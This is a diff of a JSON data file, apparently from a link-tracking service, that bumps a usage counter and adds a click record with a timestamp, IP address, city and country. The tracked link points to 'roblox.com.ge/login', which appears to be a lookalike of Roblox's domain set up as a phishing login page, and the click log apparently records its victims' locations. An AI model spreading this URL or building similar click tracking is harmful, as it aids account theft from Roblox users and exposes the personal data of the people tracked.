@@ -118,7 +118,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 972,
+    "useCount": 973,
     "createdBy": "admin",
     "clicks": [
       {
@@ -7896,6 +7896,14 @@
         "city": "Caloocan",
         "flag": "🇵🇭",
         "countryCode": "PH"
+      },
+      {
+        "timestamp": 1777216664047,
+        "ip": "102.219.163.226",
+        "country": "South Africa",
+        "city": "Durban",
+        "flag": "🇿🇦",
+        "countryCode": "ZA"
       }
     ]
   },
